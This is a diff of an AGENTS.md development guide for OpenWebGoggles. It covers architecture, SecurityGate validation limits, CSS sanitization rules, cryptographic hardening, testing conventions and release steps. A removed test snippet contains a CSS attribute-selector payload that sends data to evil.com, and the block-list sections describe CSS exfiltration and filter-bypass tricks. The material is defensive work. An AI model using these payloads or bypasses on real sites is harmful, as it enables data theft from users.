@@ -1,6 +1,6 @@
 # AGENTS.md — Development Standards for OpenWebGoggles
 
-This file captures architectural decisions, coding standards, and lessons learned from building OpenWebGoggles. Read this before making changes to avoid retreading solved problems.
+Read this before making changes to avoid retreading solved problems.
 
 ## Project Layout
 
@@ -10,12 +10,8 @@ scripts/              Python source (NOT src/)
   webview_server.py   HTTP + WebSocket server (raw asyncio, no framework)
   security_gate.py    SecurityGate — validates all state payloads before browser
   crypto_utils.py     Ed25519 + HMAC signing, NonceTracker
-  tests/              pytest suite (1660+ tests: 1577 unit + 32 BDD + 55 E2E)
-    conftest.py       Shared fixtures: gate, session_keys, nonce_tracker, session_token, E2E Playwright fixtures
-    test_security_gate.py
-    test_client_escaping.py
-    test_mcp_server.py
-    test_browser_e2e.py  Playwright E2E tests (headless Chromium, @pytest.mark.slow)
+  tests/              pytest suite (1700+ tests: 1665 unit + 32 BDD + 55 E2E)
+    conftest.py       Shared fixtures (gate, session_keys, nonce_tracker, E2E Playwright)
     features/         BDD feature files (Gherkin scenarios)
     steps/            BDD step definitions (pytest-bdd)
 assets/
@@ -28,66 +24,27 @@ assets/
     charts.js         Data-driven SVG chart renderer (bar, line, area, pie, donut, sparkline)
     validation.js     Field validation engine (required, pattern, minLength, maxLength)
     behaviors.js      Conditional show/hide/enable/disable logic
-  template/           App scaffold template for init_webview_app.sh
 ```
 
 ## JavaScript Architecture
 
-### No Build Step — IIFE + OWG Namespace
+### IIFE + OWG Namespace (No Build Step)
 
-All JS uses vanilla IIFE modules sharing `window.OWG`. No webpack, no bundler, no transpiler.
+All JS uses vanilla IIFE modules sharing `window.OWG`. **Load order matters** in `index.html`: `utils.js` → `sections.js` → `charts.js` → `validation.js` → `behaviors.js` → `app.js`. All script tags require the CSP nonce: `<script nonce="{{NONCE}}" src="...">`.
 
-```javascript
-// Every module follows this pattern:
-(function () {
-  "use strict";
-  window.OWG = window.OWG || {};
+### Key Safety Rules
 
-  function myFunction() { /* ... */ }
-
-  // Register on namespace
-  OWG.myFunction = myFunction;
-})();
-```
-
-**Load order matters.** In `index.html`:
-1. `utils.js` (no dependencies)
-2. `sections.js` (depends on utils)
-3. `charts.js` (depends on utils — SVG chart renderer)
-4. `validation.js` (depends on utils)
-5. `behaviors.js` (depends on utils)
-6. `app.js` (orchestrator — depends on all above)
-
-All script tags must have the CSP nonce: `<script nonce="{{NONCE}}" src="...">`. The server injects the nonce at request time.
-
-### Prototype Pollution Prevention
-
-- `formValues` and `fieldValidators` use `Object.create(null)` — no prototype chain
-- When iterating `Object.create(null)` objects, use `Object.prototype.hasOwnProperty.call(obj, key)` — direct `.hasOwnProperty()` crashes because there is no prototype
-- `Object.freeze(window.OWG)` at the end of `app.js` — prevents post-init tampering
-
-### DOM — No innerHTML
-
-Never use `innerHTML` for user/agent-supplied content. Use:
-- `document.createTextNode()` for plain text
-- `OWG.sanitizeHTML()` for markdown (DOMPurify-based)
-- DOM API (`createElement`, `appendChild`) for structure
-
-The SecurityGate and client-side XSS scanner both block `<script>`, `<img>`, `<iframe>`, etc. This is defense-in-depth — don't rely on only one layer.
+- **No innerHTML** — use `document.createTextNode()`, `OWG.sanitizeHTML()`, or DOM API
+- **Prototype-safe iteration** — `formValues`/`fieldValidators` use `Object.create(null)`; always use `Object.prototype.hasOwnProperty.call(obj, key)` instead of `obj.hasOwnProperty(key)`
+- **Namespace frozen** — `Object.freeze(window.OWG)` at end of `app.js` prevents post-init tampering
+- **`sanitizeHTML()` strips** — inline `style` attrs (use CSS classes instead) and all `data-*` attrs (prevents phantom action injection)
+- **CSS classes for visibility** — `.owg-page-hidden`, `.owg-tabs-hidden`, `.hidden` (not inline styles)
 
 ## Python Architecture
 
 ### SecurityGate — Rejection, Not Mutation
 
-SecurityGate validates payloads and **rejects** invalid ones. It does NOT sanitize or modify data. If a field fails validation, the entire payload is rejected with an error message.
-
-```python
-ok, err, parsed = gate.validate_state(raw_json)
-if not ok:
-    return {"error": err}  # Reject the whole thing
-```
-
-This is intentional. Mutation-based sanitization is fragile (bypass via encoding tricks, double-encoding, etc.). Rejection is simpler to reason about and test.
+SecurityGate **rejects** invalid payloads entirely — it never sanitizes or modifies data. This is intentional: mutation-based sanitization is bypass-prone.
 
 ### Key Validation Rules
 
@@ -98,275 +55,114 @@ This is intentional. Mutation-based sanitization is fragile (bypass via encoding
 | JSON nesting | 10 levels | `MAX_NESTING_DEPTH` |
 | Tab nesting | 3 levels (sections) | `MAX_SECTION_DEPTH` |
 | Sections | 50 max | `MAX_SECTIONS` |
-| Custom CSS | 50KB, no `url()`, no `@import`, no `@font-face` | `DANGEROUS_CSS_PATTERNS` |
+| Custom CSS | 50KB, no `url()`, no `@import`/`@font-face`/`@media`/`@keyframes`/`@supports`/`@layer`, no backslashes, no CSS comments | `DANGEROUS_CSS_PATTERNS` |
 | Field patterns | No nested quantifiers (ReDoS) | `_is_redos_safe()` |
 | Class names | `^[a-zA-Z][a-zA-Z0-9_ -]*$` | `CLASS_NAME_PATTERN` |
-| Top-level keys | Allowlisted set only (incl. `pages`, `activePage`) | `ALLOWED_TOP_KEYS` in `validate_state()` |
-| Pages | 20 max, keys must match `KEY_PATTERN` | `MAX_PAGES` |
-| Metric cards | 500 max, sparkline max 100 points, columns 1-6 | `MAX_ITEMS_PER_SECTION`, `MAX_SPARKLINE_POINTS`, `MAX_METRIC_COLUMNS` |
-| Chart data | 500 labels, 20 datasets, 500 data points each | `MAX_CHART_LABELS`, `MAX_DATASETS`, `MAX_DATA_POINTS` |
-| Chart dimensions | width 50-2000, height 50-1500 | `MAX_CHART_WIDTH`, `MAX_CHART_HEIGHT` |
-| Chart colors | Hex (`#RGB`/`#RRGGBB`/`#RRGGBBAA`) or theme alias | `COLOR_PATTERN`, `ALLOWED_THEME_COLORS` |
-| Log lines | Each must be `str` | `_validate_section_specific()` |
-| Field rows | int, 1-50 | `_validate_field()` |
-| Field placeholder | str, max 500 chars | `_validate_field()` |
+| Top-level keys | Allowlisted only | `ALLOWED_TOP_KEYS` |
+| Pages | 20 max, keys match `KEY_PATTERN` | `MAX_PAGES` |
+| Charts | 500 labels, 20 datasets, 500 points each | `MAX_CHART_*` |
+| WS messages | 1 MB max | `MAX_WS_MESSAGE_SIZE` |
 
 ### Thread Safety
 
-`merge_state()` in `mcp_server.py` wraps read-merge-write in a `threading.Lock()` to prevent TOCTOU race conditions. Any new file-based read-modify-write cycles must also be locked.
+`merge_state()` wraps read-merge-write in `threading.Lock()`. Post-merge results must be re-validated through SecurityGate (two valid payloads can merge into an invalid one).
 
-### Post-Merge Re-validation
+## Security Architecture
 
-When `webview_update(merge=True)` is used, the **merged result** must be re-validated through SecurityGate. Two individually valid payloads can merge into an invalid one (e.g., a merge that introduces an unknown top-level key).
+### Defense Layers
 
-## CSS Security
+1. Localhost-only binding (127.0.0.1)
+2. Bearer token auth (constant-time comparison) + trivial token guard
+3. WebSocket first-message auth + 1 MB message size limit
+4. Ed25519 signatures (server → browser) with `\x00` domain separator
+5. HMAC-SHA256 (browser → server) with `\x00` domain separator
+6. Nonce replay prevention (monotonic clock)
+7. CSP via HTTP header with per-request nonce
+8. SecurityGate validation (server) + client-side XSS scanner
+9. Rate limiting (30 actions/min, monotonic clock)
 
-### Server-Side: Block All External Resources
+### CSS Security
 
-`DANGEROUS_CSS_PATTERNS` blocks:
-- ALL `url()` — not just `javascript:` URLs. Attribute selectors + `url(https://...)` enable data exfiltration character-by-character
-- `@font-face` — `unicode-range` + external font URLs leak form values
-- `@import`, `@charset`, `@namespace` — external resource loading / parsing context override
-- CSS hex/unicode escapes (`\0062`, `\u0062`) — obfuscation of dangerous values
-- `expression()`, `-moz-binding`, `behavior:` — legacy browser code execution
+**Server-side** (`DANGEROUS_CSS_PATTERNS`) blocks all dangerous CSS constructs:
+- `url()` — data exfiltration via attribute selectors
+- All `@`-rules — resource loading, scoping bypass, animation hijacking
+- ALL backslash escapes — non-hex escapes like `\m` bypass keyword patterns (`@\media` → `@media`)
+- CSS comments `/*` — keyword splitting (`ur/**/l()` → `url()`)
+- Zero-width/bidi Unicode chars — keyword splitting in XSS patterns
 
-### Client-Side: No Inline Styles on Rendered HTML
+**Client-side** (`DANGEROUS_CSS_RE` in `utils.js`) must stay synced with server patterns. `_scopeCSS()` prepends `#content` to all selectors (prevents defacing security UI).
 
-`sanitizeHTML()` in `utils.js` strips ALL inline `style` attributes from non-SVG elements (prevents UI overlay / position:fixed attacks). This means **you cannot use inline `style="display:none"` for visibility** — it will be stripped. Instead, use CSS classes:
-- `.owg-page-hidden` — hides SPA pages (used by `app.js`)
-- `.owg-tabs-hidden` — hides inactive tab panels (used by `sections.js`)
-- `.hidden` — general-purpose hide class
+### Cryptographic Protocol
 
-Runtime `.style` manipulation via JavaScript (e.g., `el.style.display = "none"` after DOM creation) is safe — it bypasses `sanitizeHTML`. But initial HTML must use classes.
+- Domain separator: `nonce + "\x00" + payload` prevents concatenation ambiguity
+- Empty tokens and trivial tokens (`"REDACTED"`, `"test"`, etc.) auto-replaced with `secrets.token_hex(32)`
+- NonceTracker uses `time.monotonic()` (immune to wall-clock adjustments)
+- Empty/non-string nonces rejected
+- Temp files written with `umask(0o077)` (restrictive perms on shared systems)
 
-### Text Overflow Protection
+### Client-Side Hardening
 
-All text containers use `overflow-wrap: break-word; word-break: break-word;` to prevent long unbroken strings (URLs, base64 data, error paths) from overflowing their containers. This applies to:
-- `.message-box` — text sections
-- `.markdown-content` — markdown rendered content
-- `.item-content` — item list titles/subtitles (also has `min-width: 0`)
-- `.owg-table th, .owg-table td` — table cells
-- `.markdown-content th, .markdown-content td` — markdown table cells
+- `sanitizeHTML()` strips `data-*` attrs and inline `style` attrs
+- `escAnsi()` caps nesting at 20 (`MAX_ANSI_NESTING`) — prevents DoS via crafted ANSI sequences
+- `safeCopy()` uses `Object.create(null)` — no prototype chain pollution
+- SDK caps listeners at 100/event (`MAX_LISTENERS_PER_EVENT`) with deduplication
 
-Plain text sections (without `format: "markdown"`) use `.message-box-plain` which adds `white-space: pre-wrap` to preserve newlines and indentation. To render code blocks, use `format: "markdown"` with fenced code blocks.
+## Testing
 
-### Client-Side: CSS Scoping
-
-`_scopeCSS()` in `utils.js` prepends `#content` to all custom CSS selectors. This prevents agent-supplied CSS from defacing security-critical UI elements (header, session badge, connection indicator).
-
-### Client-Side: Sync with Server
-
-The client `DANGEROUS_CSS_RE` in `utils.js` must stay synced with the server's `DANGEROUS_CSS_PATTERNS`. If you add a new server-side pattern, add it client-side too.
-
-### sidebarWidth Validation
-
-Both server (`CSS_LENGTH_PATTERN`) and client validate CSS length values with `/^[0-9]+(px|em|rem|%)$/`. Invalid values fall back to `300px`.
-
-## Testing Standards
-
-### Test Organization
-
-Tests are organized by component with class-based grouping:
-
-```python
-class TestCSSExfilPrevention:
-    """Tests for blocking CSS data exfiltration vectors."""
-
-    def test_url_https_blocked(self, gate):
-        state = {"custom_css": "input[value^='a'] { background: url(https://evil.com/a) }"}
-        ok, err, _ = gate.validate_state(json.dumps(state))
-        assert not ok
-```
-
-Use the `gate` fixture from `conftest.py` — don't instantiate `SecurityGate()` inline.
-
-### OWASP / MITRE Markers
-
-Tag security tests with framework markers for traceability:
-
-```python
-@pytest.mark.owasp_a03  # Injection
-@pytest.mark.llm01      # Prompt injection
-@pytest.mark.mitre_t1059  # Command and scripting interpreter
-```
-
-### E2E Browser Tests (Playwright)
-
-End-to-end tests in `test_browser_e2e.py` use headless Chromium via Playwright to validate every section type, SPA navigation, form submission round-trips, validation, behaviors, and layouts against a real browser.
+### Running Tests
 
 ```bash
-# Install and run E2E tests
-pip install pytest-playwright && playwright install chromium
+# Unit tests (fast)
+python -m pytest scripts/tests/ -m "not slow" -v
+
+# E2E browser tests (requires playwright install chromium)
 python -m pytest scripts/tests/test_browser_e2e.py -v -m slow
-```
 
-Key design decisions:
-- **`@pytest.mark.slow`** — all E2E tests are marked `slow`; unit tests use `-m "not slow"` to skip them
-- **Shared `WebviewSession`** — avoids restarting the subprocess for every test (~3s savings each)
-- **Sync Playwright API** — uses `playwright.sync_api` to avoid async event loop conflicts with pytest-asyncio
-- **Title-based synchronization** — each test writes a unique `title`; `wait_for_title()` ensures the DOM reflects the new state before assertions run
-- **No hardcoded sleeps** — use `wait_for_function()`, `wait_for_selector()`, or locator `.wait_for()` instead of `wait_for_timeout()`
-- **Class-based visibility checks** — use `.owg-page-hidden` / `.owg-tabs-hidden` classes, not inline style selectors
-
-Fixtures (`conftest.py`):
-- `webview_session` — starts/reuses a WebviewSession subprocess
-- `playwright_browser` — starts/reuses headless Chromium
-- `e2e_page` — fresh browser context per test, navigated to webview URL
-
-### BDD Tests (pytest-bdd)
-
-Feature files in `scripts/tests/features/` with step definitions in `scripts/tests/steps/` cover lifecycle and integration scenarios using Gherkin syntax:
-
-```bash
-# Run BDD tests
+# BDD tests
 python -m pytest scripts/tests/steps/ -v -m bdd
 ```
 
-Feature coverage (32 scenarios):
-- `hot_reload.feature` (9) — version monitor, mtime detection, error backoff, path recovery
+### Conventions
+
+- Use `gate` fixture from `conftest.py` — don't instantiate `SecurityGate()` inline
+- Tag security tests: `@pytest.mark.owasp_a03`, `@pytest.mark.mitre_t1059`, etc.
+- E2E: use `wait_for_function()`/`wait_for_selector()`, never `wait_for_timeout()`
+- E2E: use CSS class selectors (`.owg-page-hidden`), not inline style selectors
+- Top-level state keys are allowlisted — nest test data under `"data"`
+- Two tabs nesting levels exceed `MAX_NESTING_DEPTH=10` by design
+
+### BDD Tests (32 scenarios)
+
+Feature files in `scripts/tests/features/`, step definitions in `scripts/tests/steps/`:
+- `hot_reload.feature` (9) — version monitor, mtime, error backoff, path recovery
 - `import_fallback.feature` (5) — relative/absolute import resolution
 - `mcp_lifecycle.feature` (5) — lifespan startup/cleanup, background tasks
 - `stale_server.feature` (5) — tool rejection, host notification
 - `cli_lifecycle.feature` (4) — SIGUSR1, status, PID files
 - `installation.feature` (4) — version detection, METADATA reading
 
-Key BDD fixtures (`steps/conftest.py`):
-- `version_monitor_env` — saves/restores module globals (`_reload_pending`, `_active_tool_calls`, `_session`, `_stale_version_msg`, `_signal_reload_requested`)
-- `mock_dist_info(tmp_path)` — creates real dist-info directory with METADATA file
-- `mock_dist_info_v2(tmp_path)` — second version dist-info for upgrade scenarios
-
 ### Hot-Reload Architecture
 
-The version monitor (`_version_monitor()` in `mcp_server.py`) uses two-tier detection:
-1. **Cheap mtime check** — polls dist-info directory stat every 30s
-2. **Full version read** — only when mtime changes, reads METADATA directly from disk
-
-Key design decisions:
-- **Direct METADATA reading** — bypasses `importlib.metadata` which caches in-process and doesn't flush in pipx/venv installs
-- **Path recovery** — if dist-info path is lost during upgrade, re-discovers via `_get_installed_version_info()`
-- **Exponential backoff** — consecutive errors use increasing sleep intervals; gives up after 10 errors
-- **Async startup** — initial metadata lookup runs in `run_in_executor()` to avoid blocking MCP lifespan (prevents -32001 timeout)
-- **Task done-callbacks** — all background tasks attach `_task_done_callback` to log unhandled crashes
-- **Host notification** — `_notify_host_stale()` proactively sends log message to MCP host via `send_log_message(level="error")`
-- **mtime=None recovery** — when `last_mtime is None` (after "unknown" version), the next successful stat forces a version recheck
-
-### Top-Level Key Allowlist Gotcha
-
-If you add a new top-level state key (e.g., `"theme"`), you must:
-1. Add it to `ALLOWED_TOP_KEYS` in `security_gate.py`
-2. Update any nesting depth tests that construct state — unknown keys are rejected before depth checking
-
-This bit us when tests used arbitrary key names like `{"nested": {...}}` at the top level. After adding the allowlist, those tests broke because `nested` wasn't an allowed key. Always nest test data under `"data"`.
-
-### JSON Nesting Depth vs Section Depth
-
-Two separate limits:
-- `MAX_NESTING_DEPTH = 10` — overall JSON structure depth (counts every dict/list level)
-- `MAX_SECTION_DEPTH = 3` — tabs-within-tabs nesting only
-
-A single level of tabs nesting creates ~5 levels of JSON depth. Two levels of tabs nesting = ~11 JSON levels, which **exceeds** `MAX_NESTING_DEPTH`. This is by design — deeply nested tabs are impractical for users anyway. Don't write tests expecting 2+ levels of tabs nesting to pass.
-
-### Ruff Linting
-
-Pre-commit hooks run ruff lint (`--fix`) and ruff format on every commit. Key rules:
-
-- `UP038`: Use `isinstance(x, int | float)` not `isinstance(x, (int, float))` — Python 3.10+ union syntax
-- `S105`: "Possible hardcoded password" — triggers on string assignments to variables named `token`, `password`, etc. Suppress with `# noqa: S105` (NOT `# nosec` — that's bandit, not ruff)
-- `S101`: `assert` is fine in tests (suppressed in `pyproject.toml` per-file-ignores)
-
-Ruff format may reformat your code between the first and second pre-commit pass. If the commit fails twice, check whether ruff reformatted files — you may need to re-stage.
-
-### Test File References After Refactoring
-
-When functions move between JS files (e.g., `esc()` moved from `app.js` to `utils.js`), update all test file path references in `test_client_escaping.py`. Tests that read JS source files to verify function presence will break if they look in the wrong file.
-
-Check for both declaration patterns:
-- `function esc(` (named function declaration)
-- `.esc = function` (namespace assignment)
+Version monitor uses two-tier detection: cheap mtime poll (30s) → full METADATA file read (only when mtime changes). Bypasses `importlib.metadata` cache. Exponential backoff on errors (gives up after 10). Async startup via `run_in_executor()` to avoid MCP -32001 timeout.
 
 ## Release Process
-
-### Publish Workflow Trigger
-
-The PyPI publish workflow triggers on `release: [published]`, **NOT** on tag push. The sequence is:
 
 1. Bump version in `pyproject.toml`
 2. Update `CHANGELOG.md`
 3. Commit and push
-4. `git tag v0.X.0 && git push --tags`
-5. **`gh release create v0.X.0 --title "..." --notes "..."`** ← this triggers publish
+4. `git tag v0.X.Y && git push --tags`
+5. `gh release create v0.X.Y --title "..." --notes "..."` ← triggers PyPI publish
 
-If you only push the tag without creating a GitHub Release, nothing gets published.
-
-### Version Matching
-
-The publish workflow verifies `pyproject.toml` version matches the git tag (without `v` prefix). Mismatches fail the build.
-
-## Security Architecture — What to Know
-
-### Nine Defense Layers
-
-1. Localhost-only binding (127.0.0.1)
-2. Bearer token auth (32-byte, constant-time comparison)
-3. WebSocket first-message auth
-4. Ed25519 signatures (server → browser)
-5. HMAC-SHA256 (browser → server)
-6. Nonce replay prevention
-7. CSP with per-request nonce (HTTP header, not meta tag)
-8. SecurityGate validation
-9. Rate limiting (30 actions/min)
-
-### CSP Is Via HTTP Header
-
-CSP is delivered via the `Content-Security-Policy` HTTP header in `webview_server.py`, not a `<meta>` tag. HTTP headers are more secure — they can't be overridden by injected HTML.
-
-### Token Stripping
-
-Session tokens must be stripped from any data broadcast over WebSocket. The HTTP manifest endpoint and the WS manifest broadcast both redact `session.token` to `"REDACTED"`.
-
-### Close Message XSS
-
-The close message passed to `webview_close()` is XSS-scanned before being broadcast. If it fails, it falls back to `"Session complete."`.
+The publish workflow verifies `pyproject.toml` version matches the git tag.
 
 ## Common Pitfalls
 
-### Context Overflow
-
-Large agent results can overflow the context window. When using sub-agents for analysis:
-- Set size limits on findings
-- Use JSON-formatted summaries, not raw dumps
-- Don't return entire file contents — return line numbers and snippets
-
-### Deep Merge Semantics
-
-`_deep_merge()` follows these rules:
-- `dict + dict` → recursive merge
-- `list + list` → **replace** (NOT append)
-- anything else → override wins
-
-This means you can't incrementally append to a list with merge. To add items to `tasks`, send the full updated list.
-
-### File-Based Data Contract
-
-The agent ↔ browser interface is three JSON files in `.openwebgoggles/`:
-- `state.json` — agent → browser (what to show)
-- `actions.json` — browser → agent (what the human decided)
-- `manifest.json` — shared session config
-
-The server watches these files and pushes changes via WebSocket. You can debug by `cat`-ing these files directly.
-
-### ANSI Color Rendering
-
-`escAnsi()` in `utils.js` converts ANSI escape codes to `<span>` tags. It tracks open/close count to prevent unclosed span accumulation. If you modify this function, ensure:
-- `</span>` only emits when `openCount > 0`
-- Remaining open spans are closed at the end of the string
-- Reset (`\033[0m`) closes all open spans
-
-### Preset Expansion
-
-`_expand_preset()` transforms shorthand state into full state objects. Presets:
-- `progress` → `{tasks: [...], percentage: N}` → wraps in progress section + actions
-- `confirm` → `{title, message, details?}` → wraps in text section + approve/reject
-- `log` → `{lines: [...], maxLines?}` → wraps in log section
-
-Presets expand **before** SecurityGate validation, so the expanded state must also be valid.
+- **Ruff UP038**: `isinstance(x, int | float)` not `(int, float)` — Python 3.10+ union syntax
+- **Ruff S105**: Suppress with `# noqa: S105` (not `# nosec`)
+- **Ruff reformats**: May need to re-stage after first pre-commit hook failure
+- **Deep merge**: `list + list` → replace (NOT append). Send full updated lists.
+- **File data contract**: Three JSON files in `.openwebgoggles/` — `state.json`, `actions.json`, `manifest.json`
+- **ANSI rendering**: `escAnsi()` tracks open/close count; `</span>` only emits when `openCount > 0`; reset (`\033[0m`) closes all open spans
+- **Presets expand before validation**: `_expand_preset()` output must also be valid
+- **JS file references**: When functions move between files, update test path references in `test_client_escaping.py`
+- **Context overflow**: Use size-limited sub-agent results, not raw file dumps
